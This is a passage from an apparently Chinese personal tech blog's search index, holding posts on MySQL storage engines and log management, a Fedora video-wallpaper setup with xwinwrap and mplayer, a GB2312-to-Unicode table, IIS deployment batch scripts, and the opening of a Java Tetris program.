存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1. mysql 存储引擎 1.1. 引擎分类 可以表述为mysql的'文件系统', 存储引擎可以针对单表来进行设置。 mysql提供的有(最常用的InnoDB、MyISAM) : InnoDB MyISAM MEMORY ARCHIVE FEDERATED EXAMPLE BLACKHOLE MERGE NDBCLUSTER CSV 第三方: TokuDB 1.2. InnoDB --- 查看默认的数据库引擎 mysql\u003e select @@default_storage_engine; --- 查看当前数据库支持的数据库引擎 mysql\u003e show engines; --- 查看某个表所使用的存储引擎 mysql\u003e show create table city --- show table status like 'city'\\G --- select t.TABLE_NAME,t.TABLE_SCHEMA, t.ENGINE from `TABLES` t where t.TABLE_SCHEMA = 'world' 1.3. 引擎设置 编译时直接指定默认的存储引擎 在启动的配置文件中指定 [mysqld] default-storage-engine=InnoDB 使用SET命令为当前客户机会话设置 mysql\u003e SET @@storage-engine=InnoDB 在建表语句(CREATE TABLE)中指定(开发规范) mysql\u003e CREATE TABLE T(I INT) ENGINE = InnoDB 1.4. 表空间 共享表空间： 主要存放系统元数据等 独立表空间： 主要存放用户数据 1.4.1. 表空间设置 查看: show variables like 'innodb_data_file_path' [mysqld] ; 第一个ibdata 必定是一个固定大小的，若在启动后修改，则需要设置与实际大小一致，不能多也不能少，第二个则不受限制(默认是下12M) innodb_data_file_path=ibdata1:512M;ibdata2:512M:autoextend 1.5. 表空间数据文件 从5.6开始，mysql会为每个新表配置独立的表空间，设置项为innodb_file_per_table: ON,此项修改仅会更改新建表的属性。 *.frm: 元数据,包含表结构等 *.ibd: 表的数据文件 1.6. 事务ACID Atomic(原子性): 所有语句作为一个单元全部成功执行或全部取消 Consistent(一致性): 如果数据库在事务开始时处于一致状态，则在执行改事务期间将保留一致状态。 Isolated(隔离性): 事务之间互不影响。 Durable(持久性): 事务成功个完成后，所做的所有更改都会准确的记录在数据库中，所做的更改不会丢失。 1.6.1. 事务(SQL)控制语句 标准的事务语句指的是DML语句 BEGIN(START TRANSACTION): 开始一个新的事务 COMMIT： 永久提交当前事务的更改 ROLLBACK： 回滚当前事务更改 SAVEPOINT: 分配事务过程中的一个位置，以提供将来引用 ROLLBACK TO SAVEPOINT: 取消在SAVEPOINT之后执行的更改 RELEASE SAVEPOINT: 删除SAVEPOINT标识符 SET AUTOCOMMIT=(OFF|ON)|(0|1): 为当前连接启用或禁用autocommit模式,默认ON ,未提交前其他人不能查看 TODO: 程序是否也需要自动执行commit(如果程序写了事务开始的,那么也需要写结束,那就是和服务器设置没有什么关系) my.cnf 修改(存在频繁和大量数据修改时，建议关闭自动提交) [mysqld] AUTOCOMMIT=0 隐式提交 https://www.cnblogs.com/kerrycode/p/8649101.html START TRANSACTION SET AUTOCOMMIT = 1 DDL ALTER、CREATE、DROP DCL GRANT、REVOKE、SET PASSWORD 锁定语句 LOCK TABLES、UNLOCK TABLES TRUNCATE TABLE LOAD DATA INFILE SELECT FOR UPDATE 1.7. RODO “重做日志”,是事务日志的一种 ,在事务ACID中,实现的是\"D\"持久化的作用 1.8. UNDO “回滚日志”,是事务日志的一种,在事务ACID中,实现的是\"A\"、\"C\",原子性和一致性的作用 1.9. mysql 四种隔离级别 READ UNCOMMITTED 允许事务查看其他事务所进行的未提交更改 READ COMMITTED 允许事务查看其他事务所进行的已提交更改 REPEATABLE READ*** 确保每个事务的SELECT输出一致 InnoDB的默认级别(show variables like '%iso%') SERIALIZABLE 将一个事务的结果与其他事务完全隔离 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:0:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"Mysql 日志管理","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"1. Mysql 日志管理 1.1. 类型 日志文件 选项 文件名(表名称) 程序 错误 --log-error host_name.err N/A 常规 --general_log host_name.loggeneral_log N/A 慢(速)查询 --slow_query_log--long_query_time host_name-show.logshow_log mysqldumpslow 二进制 --log-bin--expire-logs-days host_name-bin.000001 mysqlbinlog 审计 --audit_log--audit_log_file audit.log N/A 1.2. 错误日志 配置方法: [mysqld] log-error=/var/log/mysql/mysql.log 查看方法 mysql\u003e show variables like '%log_error% 作用 记录mysql数据库的一般状态及报错信息,是我们对于数据库常规报错处理的常用日志 1.3. 常规日志 配置方法 [mysqld] general_log=on general_log_file=/var/log/mysql/server2.log 查看方法 show variables like '%gen%' 作用 记录mysql所有执行成功的语句,可以作审计用,但很少开启 1.4. 二进制日志(binlog) 二进制日志会记录已提交的数据,以event的形式记录到二进制文件中,其常用的记录格式有: row: 行模式,即数据行的变化过程,将某一个值修改到另一个值的过程(建议及常用模式) TODO: mysql 配置文件中是否区分大小写(这个需要根据官方建议核查) statement: 语句模式,直接记录执行过的语句,其优点是记录的数据好分析,数据量级小,比如批量修改,缺点就是记录函数(如:now())类操作不是特别准确(默认模式show variables like '%binlog_format%' ); mixed: 以上两种的混合模式 开启、关闭及记录格式 [mysqld] # 开启 log-bin = /data/mysql56/3307/data/mysql-bin/mysql-bin binlog_format = row # 关闭注释上面两个配置即可 # 临时关闭 set sql_log_bin=0 # 命令行修改 set global binlog_format = 'row' sync_binlog 值为1时，每次事务提交时就向磁盘进行写入 1.5. binlog 管理 pos: 开始位置号 End_log_pos: 结束位置号 查看当前所有二进制日志可用信息: show binary logs; 当前正在使用的binlog日志: show master status 查看二进制日志中记录的事件: show binlog events in 'mysql-bin.000002'; +------------------+-----+-------------+-----------+-------------+---------------------------------------+ | Log_name | Pos | Event_type | Server_id | End_log_pos | Info | +------------------+-----+-------------+-----------+-------------+---------------------------------------+ | mysql-bin.000004 | 4 | Format_desc | 10 | 120 | Server ver: 5.6.50-log, Binlog ver: 4 | | mysql-bin.000004 | 120 | Query | 10 | 192 | BEGIN | | mysql-bin.000004 | 192 | Table_map | 10 | 248 | table_id: 72 (test.test_table) | | mysql-bin.000004 | 248 | Write_rows | 10 | 292 | table_id: 72 flags: STMT_END_F | | mysql-bin.000004 | 292 | Xid | 10 | 323 | COMMIT /* xid=36 */ | +------------------+-----+-------------+-----------+-------------+---------------------------------------+ 查看二进制文件内容(mysqlbinlog可能不会识别default-character-set=utf8这个指令,报错为unknown variable,解决指定参数--no-defaults) TODO: unknown variable ‘default-character-set=utf8’(这个不识别就不识别吧,具体不是很清楚,也没有咨询到解决方案) # 查看binlog内容(仅包含DDL操作) $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults /data/mysql56/3307/data/mysql-bin/mysql-bin/mysql-bin.000004 # 查看binlog详细内容(注释中包含大概的详细语句) $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults --base64-output=decode-rows -v mysql-bin.000004 # @1: 代表第一列 @2: 代表第二列 ### INSERT INTO `test`.`test_table` ### SET ### @1=6 ### @2='333' # at 292 # 范围截取 $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults --start-position=192 --stop-position=323 --base64-output=decode-rows -v ./data/mysql-bin/mysql-bin.000004 # 导出为数据库可恢复文件(恢复执行 source ./binlog.sql) $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults --start-position=192 --stop-position=323 ./data/mysql-bin/mysql-bin.000004 \u003e ./binlog.sql # 刷新日志(重新生成一个binlog日志) mysql\u003e flush logs; # 设置二进制日志保存天数,默认永久保留(建议永久保留) mysql\u003e set global expire_logs_days = 90; # 手动删除(删除3天前) mysql\u003e purge binary logs before now() - interval 3 day; # 删除到那个日志文件 mysql\u003e purge binary logs to 'mysql-bin.000020'; 1.6. 慢日志管理 (my.cnf 中配置无顺序要求) show variables like '%slow%' show variables like '%long% show variables like '%indexes%' 查询 是将mysql服务中影响数据库性能的相关sql语句记录到日志文件中 通过对这些特殊的sql语句分析,改进以达到提高数据库性能的目的 设置 long_query_time: 设定慢查询的阀值,超出设定值的sql即被记录到慢查询日志,缺省值为10s show_query_log : 指定是否开启慢查询日志 slow_query_log_file: 指定慢日志文件存放位置,可以为空,系统会给一个缺省的文件host_name-slow.log min_examined_row_limit: 查询检查返回少于改参数指定行的sql不会记录到慢查询日志 log_queries_not_using_indexes: 不使用索引的慢查询日志是否记录到索引 mysqldumpslow(扩展命令 mysqlsla、pt-query-diagest percona-toolkit) 导出host_name-slow.log日志中执行次数最多的前10条数据 mysqldumpslow -s c -t 10 host_name-slow.log 导出host_name-slow.log日志中平均执行时间的前10条数据 mysqldumpslow -s at -t 10 host_name-slow.log ","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/:0:0","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","那些有用没用的"],"content":"Fedora视频桌面","date":"2022-06-24","objectID":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/","tags":["linux","fedora"],"title":"Fedora视频桌面","uri":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/"},{"categories":["linux","那些有用没用的"],"content":"- 想了一下，网络上关于fedora桌面的美化似乎还是很少的,这对于我大fedora发展似乎是很不利的，凭什么ubuntu就可以有那么多的好东西。 目前正常来说，我们能做的似乎只有简单的修改下壁纸，我记得不知道是那个fedora版本，在设置里面就是可以直接设置壁纸轮换的，但是现在似乎没有这个功能了(至少fedora 32是不能直接设置轮换了),不过可以通过另外的方式解决。这就是下面要说的第一种美化。 壁纸轮换 Dynamic Wallpaper Editor这个工具可以通过gui界面完成轮换壁纸的设置 壁纸轮换实际上在32中默认不能直接设置了(忘记了以前是不是可以)，但是如果你仔细的话，在设置那儿你可以看到有一个壁纸不一样，那个壁纸右下角有一个表一样的小图标，那个就是一个轮换壁纸，虽然不能直接设置轮换，但gnome仍然是支持的，那个壁纸的配置文件是/usr/share/backgrounds/gnome/adwaita-timed.xml,具体引用配置文件的地方是/usr/share/gnome-background-properties/adwaita.xml,因此我们只需要按照他的格式配置一个就可以实现壁纸轮换的功能了。 $\u003e sudo cp /usr/share/backgrounds/gnome/adwaita-timed.xml /home/cxd/.backgrounds/stars-timed.xml $\u003e sudo vim /home/cxd/.backgrounds/stars-timed.xml \u003cbackground\u003e \u003cstarttime\u003e \u003cyear\u003e2020\u003c/year\u003e \u003cmonth\u003e8\u003c/month\u003e \u003cday\u003e17\u003c/day\u003e \u003chour\u003e1\u003c/hour\u003e \u003cminute\u003e00\u003c/minute\u003e \u003csecond\u003e00\u003c/second\u003e \u003c/starttime\u003e \u003cstatic\u003e \u003cduration\u003e4000.0\u003c/duration\u003e \u003cfile\u003e/home/cxd/.backgrounds/stars/00001.jpg\u003c/file\u003e \u003c/static\u003e \u003ctransition type=\"overlay\"\u003e \u003cduration\u003e847.0\u003c/duration\u003e \u003cfrom\u003e/home/cxd/.backgrounds/stars/00001.jpg\u003c/from\u003e \u003cto\u003e/home/cxd/.backgrounds/stars/00050.jpg\u003c/to\u003e \u003c/transition\u003e \u003cstatic\u003e \u003cduration\u003e4000.0\u003c/duration\u003e \u003cfile\u003e/home/cxd/.backgrounds/stars/00050.jpg\u003c/file\u003e \u003c/static\u003e \u003c/background\u003e 以上是我自己配置的一部分,static是指定某一张壁纸展示的时间(秒)和文件位置, transition是指定从那一张壁纸轮换到那一张壁纸，轮换需要多少时间(秒),这个设置可以让轮换的时候看起来比较平滑，过渡的时候有点朦胧的感觉。当然也可以不用设置，不过切换的时候感觉有点怪异就是了,另外时间需要总和为86400即一天,似乎也可以不用，每怎么详细测试过。 $\u003e vim /home/cxd/.backgrounds/stars.xml \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE wallpapers SYSTEM \"gnome-wp-list.dtd\"\u003e \u003c!-- /usr/share/gnome-background-properties --\u003e \u003cwallpapers\u003e \u003cwallpaper deleted=\"false\"\u003e \u003cname\u003eDefault Background\u003c/name\u003e \u003cfilename\u003e/home/cxd/.backgrounds/stars-timed.xml\u003c/filename\u003e \u003coptions\u003ezoom\u003c/options\u003e \u003cshade_type\u003esolid\u003c/shade_type\u003e \u003cpcolor\u003e#3465a4\u003c/pcolor\u003e \u003cscolor\u003e#000000\u003c/scolor\u003e \u003c/wallpaper\u003e \u003c/wallpapers\u003e $\u003e sudo ln -s /home/cxd/.backgrounds/stars.xml /usr/share/gnome-background-properties/stars.xml # 不行的话直接copy到后面的那个目录里面区就可以了 这个配置文件是用来接入系统的，如果你没有分离两个/usr和/home的话，直接做个软链接应该就可以了，或者直接copy到/usr/share/gnome-background-properties/里面区也行。 一般上面两步处理完就可以直接在设置 \u003e 背景 就可以看到你刚刚配置的那个轮换壁纸了，如果看不到，你可以注销登陆或者alt+f2然后输入 r 重启 gnome也可以。 实际上关于壁纸轮换还有个骚操作，就是用定时任务 $\u003e 0 */5 * * * /bin/bash -c 'DISPLAY=:0 GSETTINGS_BACKEND=dconf /usr/bin/gsettings set org.gnome.desktop.background picture-uri \"file:///home/\u003cUser\u003e/.local/share/backgrounds/0$(shuf -i 0-8 -n 1).png\"' ## 需要注意的事，这个切换时间不能太短，否则容易导致桌面崩溃 视频壁纸 https://www.linuxuprising.com/2019/05/livestream-wallpaper-for-your-gnome.html 关于视频壁纸，这应该是很多人想要的，但网络上似乎没有很明确的安装方法，以下我根据多方资料整理出来了一个可用的方案. 以下为具体实现: 环境需要 mplayer用来播放视频用的 xwinwrap 核心工具 supervisord 用来管理程序的 mplayer需要启用rpmfusion库，安装完后直接dnf安装就可以了 $\u003e sudo dnf install https://mirrors.ustc.edu.cn/rpmfusion/free/fedora/rpmfusion-free-release-38.noarch.rpm $\u003e sudo dnf install mplayer 源码位置: https://github.com/ujjwal96/xwinwrap#installing 安装编译: $\u003e git clone https://github.com/r00tdaemon/xwinwrap.git $\u003e cd xwinwrap # fedora 38 $\u003e sudo dnf install libX11-devel libXext-devel libXrender-devel libXrandr-dev gcc -y $\u003e make 将编译后产生的文件xwinwrap复制到/usr/local/bin/下，并赋执行权限即可。 supervisord 可以不安装，不装的话xwinwrap支持直接以守护进程形式运行。 以上环境准备完成。下面简述下我的配置。 xwinwrap启动方式(实际命令说明不做说明了，自己-h就了解了，东西不多) $\u003e /usr/local/bin/xwinwrap -ni -o 1 -fdt -fs -s -st -sp -b -nf -- mplayer -nolirc -framedrop -nosound -loop 0 -wid WID -quiet /home/cxd/.backgrounds/stars/00000.mp4 以上命令终端执行后实际上桌面就已经可以看到效果了 我的supervisor管理配置 [program:xwinwrap] command=/usr/local/bin/xwinwrap -ni -o 1 -fdt -fs -s -st -sp -b -nf -- mplayer -framedrop -nosound -loop 0 -wid WID -quiet /home/cxd/.backgrounds/stars/00000.mp4 directory=/home/cxd/.backgrounds autostart=false autorestart=false user=cxd # 这个是你当前登陆的用户 stopasgroup=true killasgroup=true redirect_stderr=true stdout_logfile=/var/log/supervisor/xwinwrap.log stdout_logfile_maxbytes=10MB stdout_logfile_backups=10 environment=DISPLAY=:1 # 注意: 这个极其重要，必须配置，不然他会找不到显示器，不知道可以用env命令查看下对应用的是那个 注：fedora 32 默认是wayland桌面，xwinwrap似乎也是不支持的，需要切换为X11 文件下载下来后解压到~/.backgrounds/下，复制stars.xml到/usr/share/gnome-background-properties/目录下就可以了，另外里面还包含一个视频。 ","date":"2022-06-24","objectID":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/:0:0","tags":["linux","fedora"],"title":"Fedora视频桌面","uri":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/"},{"categories":["那些有用没用的"],"content":"Gb2312Unicode对照表","date":"2022-06-24","objectID":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/","tags":["linux"],"title":"Gb2312Unicode对照表","uri":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["那些有用没用的"],"content":" 0xA1A1, 0x3000, /* '　' -\u003e 12288 */ 0xA1A2, 0x3001, /* '、' -\u003e 12289 */ 0xA1A3, 0x3002, /* '。' -\u003e 12290 */ 0xA1A4, 0x30FB, /* '·' -\u003e 12539 */ 0xA1A5, 0x02C9, /* 'ˉ' -\u003e 713 */ 0xA1A6, 0x02C7, /* 'ˇ' -\u003e 711 */ 0xA1A7, 0x00A8, /* '¨' -\u003e 168 */ 0xA1A8, 0x3003, /* '〃' -\u003e 12291 */ 0xA1A9, 0x3005, /* '々' -\u003e 12293 */ 0xA1AA, 0x2015, /* '—' -\u003e 8213 */ 0xA1AB, 0xFF5E, /* '～' -\u003e 65374 */ 0xA1AC, 0x2016, /* '‖' -\u003e 8214 */ 0xA1AD, 0x2026, /* '…' -\u003e 8230 */ 0xA1AE, 0x2018, /* '‘' -\u003e 8216 */ 0xA1AF, 0x2019, /* '’' -\u003e 8217 */ 0xA1B0, 0x201C, /* '“' -\u003e 8220 */ 0xA1B1, 0x201D, /* '”' -\u003e 8221 */ 0xA1B2, 0x3014, /* '〔' -\u003e 12308 */ 0xA1B3, 0x3015, /* '〕' -\u003e 12309 */ 0xA1B4, 0x3008, /* '〈' -\u003e 12296 */ 0xA1B5, 0x3009, /* '〉' -\u003e 12297 */ 0xA1B6, 0x300A, /* '《' -\u003e 12298 */ 0xA1B7, 0x300B, /* '》' -\u003e 12299 */ 0xA1B8, 0x300C, /* '「' -\u003e 12300 */ 0xA1B9, 0x300D, /* '」' -\u003e 12301 */ 0xA1BA, 0x300E, /* '『' -\u003e 12302 */ 0xA1BB, 0x300F, /* '』' -\u003e 12303 */ 0xA1BC, 0x3016, /* '〖' -\u003e 12310 */ 0xA1BD, 0x3017, /* '〗' -\u003e 12311 */ 0xA1BE, 0x3010, /* '【' -\u003e 12304 */ 0xA1BF, 0x3011, /* '】' -\u003e 12305 */ 0xA1C0, 0x00B1, /* '±' -\u003e 177 */ 0xA1C1, 0x00D7, /* '×' -\u003e 215 */ 0xA1C2, 0x00F7, /* '÷' -\u003e 247 */ 0xA1C3, 0x2236, /* '∶' -\u003e 8758 */ 0xA1C4, 0x2227, /* '∧' -\u003e 8743 */ 0xA1C5, 0x2228, /* '∨' -\u003e 8744 */ 0xA1C6, 0x2211, /* '∑' -\u003e 8721 */ 0xA1C7, 0x220F, /* '∏' -\u003e 8719 */ 0xA1C8, 0x222A, /* '∪' -\u003e 8746 */ 0xA1C9, 0x2229, /* '∩' -\u003e 8745 */ 0xA1CA, 0x2208, /* '∈' -\u003e 8712 */ 0xA1CB, 0x2237, /* '∷' -\u003e 8759 */ 0xA1CC, 0x221A, /* '√' -\u003e 8730 */ 0xA1CD, 0x22A5, /* '⊥' -\u003e 8869 */ 0xA1CE, 0x2225, /* '∥' -\u003e 8741 */ 0xA1CF, 0x2220, /* '∠' -\u003e 8736 */ 0xA1D0, 0x2312, /* '⌒' -\u003e 8978 */ 0xA1D1, 0x2299, /* '⊙' -\u003e 8857 */ 0xA1D2, 0x222B, /* '∫' -\u003e 8747 */ 0xA1D3, 0x222E, /* '∮' -\u003e 8750 */ 0xA1D4, 0x2261, /* '≡' -\u003e 8801 */ 0xA1D5, 0x224C, /* '≌' -\u003e 8780 */ 0xA1D6, 0x2248, /* '≈' -\u003e 8776 */ 0xA1D7, 0x223D, /* '∽' -\u003e 8765 */ 0xA1D8, 0x221D, /* '∝' -\u003e 8733 */ 0xA1D9, 0x2260, /* '≠' -\u003e 8800 */ 0xA1DA, 0x226E, /* '≮' -\u003e 8814 */ 0xA1DB, 0x226F, /* '≯' -\u003e 8815 */ 0xA1DC, 0x2264, /* '≤' -\u003e 8804 */ 0xA1DD, 0x2265, /* '≥' -\u003e 8805 */ 0xA1DE, 0x221E, /* '∞' -\u003e 8734 */ 0xA1DF, 0x2235, /* '∵' -\u003e 8757 */ 0xA1E0, 0x2234, /* '∴' -\u003e 8756 */ 0xA1E1, 0x2642, /* '♂' -\u003e 9794 */ 0xA1E2, 0x2640, /* '♀' -\u003e 9792 */ 0xA1E3, 0x00B0, /* '°' -\u003e 176 */ 0xA1E4, 0x2032, /* '′' -\u003e 8242 */ 0xA1E5, 0x2033, /* '″' -\u003e 8243 */ 0xA1E6, 0x2103, /* '℃' -\u003e 8451 */ 0xA1E7, 0xFF04, /* '＄' -\u003e 65284 */ 0xA1E8, 0x00A4, /* '¤' -\u003e 164 */ 0xA1E9, 0xFFE0, /* '￠' -\u003e 65504 */ 0xA1EA, 0xFFE1, /* '￡' -\u003e 65505 */ 0xA1EB, 0x2030, /* '‰' -\u003e 8240 */ 0xA1EC, 0x00A7, /* '§' -\u003e 167 */ 0xA1ED, 0x2116, /* '№' -\u003e 8470 */ 0xA1EE, 0x2606, /* '☆' -\u003e 9734 */ 0xA1EF, 0x2605, /* '★' -\u003e 9733 */ 0xA1F0, 0x25CB, /* '○' -\u003e 9675 */ 0xA1F1, 0x25CF, /* '●' -\u003e 9679 */ 0xA1F2, 0x25CE, /* '◎' -\u003e 9678 */ 0xA1F3, 0x25C7, /* '◇' -\u003e 9671 */ 0xA1F4, 0x25C6, /* '◆' -\u003e 9670 */ 0xA1F5, 0x25A1, /* '□' -\u003e 9633 */ 0xA1F6, 0x25A0, /* '■' -\u003e 9632 */ 0xA1F7, 0x25B3, /* '△' -\u003e 9651 */ 0xA1F8, 0x25B2, /* '▲' -\u003e 9650 */ 0xA1F9, 0x203B, /* '※' -\u003e 8251 */ 0xA1FA, 0x2192, /* '→' -\u003e 8594 */ 0xA1FB, 0x2190, /* '←' -\u003e 8592 */ 0xA1FC, 0x2191, /* '↑' -\u003e 8593 */ 0xA1FD, 0x2193, /* '↓' -\u003e 8595 */ 0xA1FE, 0x3013, /* '〓' -\u003e 12307 */ 0xA2B1, 0x2488, /* '⒈' -\u003e 9352 */ 0xA2B2, 0x2489, /* '⒉' -\u003e 9353 */ 0xA2B3, 0x248A, /* '⒊' -\u003e 9354 */ 0xA2B4, 0x248B, /* '⒋' -\u003e 9355 */ 0xA2B5, 0x248C, /* '⒌' -\u003e 9356 */ 0xA2B6, 0x248D, /* '⒍' -\u003e 9357 */ 0xA2B7, 0x248E, /* '⒎' -\u003e 9358 */ 0xA2B8, 0x248F, /* '⒏' -\u003e 9359 */ 0xA2B9, 0x2490, /* '⒐' -\u003e 9360 */ 0xA2BA, 0x2491, /* '⒑' -\u003e 9361 */ 0xA2BB, 0x2492, /* '⒒' -\u003e 9362 */ 0xA2BC, 0x2493, /* '⒓' -\u003e 9363 */ 0xA2BD, 0x2494, /* '⒔' -\u003e 9364 */ 0xA2BE, 0x2495, /* '⒕' -\u003e 9365 */ 0xA2BF, 0x2496, /* '⒖' -\u003e 9366 */ 0xA2C0, 0x2497, /* '⒗' -\u003e 9367 */ 0xA2C1, 0x2498, /* '⒘' -\u003e 9368 */ 0xA2C2, 0x2499, /* '⒙' -\u003e 9369 */ 0xA2C3, 0x249A, /* '⒚' -\u003e 9370 */ 0xA2C4, 0x249B, /* '⒛' -\u003e 9371 */ 0xA2C5, 0x2474, /* '⑴' -\u003e 9332 */ 0xA2C6, 0x2475, /* '⑵' -\u003e 9333 */ 0xA2C7, 0x2476, /* '⑶' -\u003e 9334 */ 0xA2C","date":"2022-06-24","objectID":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/:0:0","tags":["linux"],"title":"Gb2312Unicode对照表","uri":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["那些年的收藏"],"content":"IIS命令操作","date":"2022-06-24","objectID":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/","tags":["bat","windows","scripts"],"title":"IIS命令操作","uri":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"},{"categories":["那些年的收藏"],"content":"1. IIS 站点部署 @echo off title Industrial belt project deployment script echo 1. This script is only suitable for the first installation echo 2. Please check and modify the following variable values before deployment echo Sitename: Site name, please separate with spaces or commas echo BackPort: Site bound port echo NetVersion: .netVersion(as:v4.0) echo NetModel: Program operation mode classic (Integrated) or integrated (Classic) set AppCmd=C:\\Windows\\System32\\inetsrv\\appcmd.exe set Sitename=admin.example.com www.example.com set SitePath=C:\\weboxb\\example.com set BackPort=8010 set NetVersion=v4.0 set NetModel=Integrated set LogPath=D:\\iislogs\\ :: Confirm variable initialisation echo Confirming the initialisation: echo AppCmd=%AppCmd% echo Sitename=%Sitename% echo SitePath=%SitePath% echo BackPort=%BackPort% echo NetVersion=%NetVersion% echo NetModel=%NetModel% echo LogPath=%LogPath% pause (for %%a in (%Sitename%) do ( echo Creating application pool for %%a %AppCmd% add apppool /name:%%a /managedRuntimeVersion:%NetVersion% /managedPipelineMode:%NetModel% if errorlevel 1 goto Error echo Creating site directory for %%a mkdir %SitePath%\\%%a if errorlevel 1 goto Error echo Creating site for %%a %AppCmd% add site /name:%%a /bindings:\"http://%%a:%BackPort%\" /physicalpath:%SitePath%\\%%a if errorlevel 1 goto Error echo Associating application pool for %%a %AppCmd% set site /site.name:%%a /[path='/'].applicationPool:%%a if errorlevel 1 goto Error echo. )) echo The execution is complete, please check the execution log at %LogPath%. goto End :Error echo An error occurred. Please check the configurations and try again. pause exit :End pause 2. IIS 站点域名修改 @echo off title update site bind domain echo Please carefully check the configuration content! pause set AppCmd=C:\\Windows\\System32\\inetsrv\\appcmd.exe set BackPort=80 set DomainName=example.cn set NewDomainName=example.com :: Specify log location :: set LogPath=D:/iislogs/ :: /logfile.directory:%LogPath% %AppCmd% set SITE \"www.%DomainName%\" /bindings:\"http://www.%NewDomainName%:%BackPort%\" :: %AppCmd% set SITE \"www.%DomainName%\" /bindings:\"http://www.%NewDomainName%:%BackPort%,http://www.%NewDomainName%:%BackPort%\" echo The execution is complete, please check the execution result... pause ","date":"2022-06-24","objectID":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/:0:0","tags":["bat","windows","scripts"],"title":"IIS命令操作","uri":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"},{"categories":["linux","那些有用没用的"],"content":"俄罗斯方块","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/","tags":["linux","java","scripts"],"title":"Java 俄罗斯方块","uri":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/"},{"categories":["linux","那些有用没用的"],"content":" import javax.swing.*; import java.awt.*; import java.awt.event.*; import javax.swing.border.EtchedBorder; import javax.swing.border.Border; /** * 游戏主类，继承自JFrame类，负责游戏的全局控制。 * 内含 * 1、一个GameCanvas画布类的实例对象， * 2、一个保存当前活动块 (ErsBlock)实例的对象， * 3、一个保存当前控制面板（ ControlPanel）实例的对象; */ public class ErsBlocksGame extends JFrame { //每填满一行计多少分 public final static int PER_LINE_SCORE = 100; //积多少分以后能升级 public final static int PER_LEVEL_SCORE = PER_LINE_SCORE * 20; //最大级数是10级 public final static int MAX_LEVEL = 10; //默认级数是5 public final static int DEFAULT_LEVEL = 5; private GameCanvas canvas; private ErsBlock block; private boolean playing = false; private ControlPanel ctrlPanel; private JMenuBar bar = new JMenuBar(); private JMenu mGame = new JMenu(\"游戏\" ), mControl = new JMenu(\"控制 \"), mWindowStyle = new JMenu(\"游戏风格 \"), mInfo = new JMenu(\"信息 \"); private JMenuItem miNewGame = new JMenuItem(\"新游戏\" ), miSetBlockColor = new JMenuItem(\"设置方块颜色 ...\"), miSetBackColor = new JMenuItem(\"设置背景颜色 ...\"), miTurnHarder = new JMenuItem(\"升高游戏难度 \"), miTurnEasier = new JMenuItem(\"降低游戏难度 \"), miExit = new JMenuItem(\"退出 \"), miPlay = new JMenuItem(\"开始 \"), miPause = new JMenuItem(\"暂停 \"), miResume = new JMenuItem(\"恢复 \"), miStop = new JMenuItem(\"中止游戏 \"), miAuthor = new JMenuItem(\"版本：俄罗斯方块 1.0\"), miSourceInfo = new JMenuItem(\"源代码由 Java实现\"); private JCheckBoxMenuItem miAsWindows = new JCheckBoxMenuItem(\"Windows\"), miAsMotif = new JCheckBoxMenuItem(\"Motif\"), miAsMetal = new JCheckBoxMenuItem(\"Metal\", true); //主游戏类的构造方法@param title String，窗口标题 @SuppressWarnings( \"deprecation\") public ErsBlocksGame(String title) { super(title); setSize( 315, 392 ); Dimension scrSize = Toolkit.getDefaultToolkit() .getScreenSize(); setLocation((scrSize.width - getSize() .width) / 2, (scrSize.height - getSize() .height) / 2); createMenu(); Container container = getContentPane(); container.setLayout( new BorderLayout(6, 0)); canvas = new GameCanvas(20, 12); ctrlPanel = new ControlPanel(this); container.add(canvas, BorderLayout.CENTER); container.add(ctrlPanel, BorderLayout.EAST); addWindowListener( new WindowAdapter() { public void windowClosing(WindowEvent we) { stopGame(); System.exit( 0); } }); addComponentListener( new ComponentAdapter() { public void componentResized(ComponentEvent ce) { canvas.fanning(); } }); show(); canvas.fanning(); } //让游戏\"复位 \" public void reset() { ctrlPanel.reset(); canvas.reset(); } //判断游戏是否还在进行 //@return boolean, true-还在运行，false-已经停止 public boolean isPlaying() { return playing; } /** * 得到当前活动的块 * @return ErsBlock, 当前活动块的引用 */ public ErsBlock getCurBlock() { return block; } //得到当前画布，@return GameCanvas, 当前画布的引用 public GameCanvas 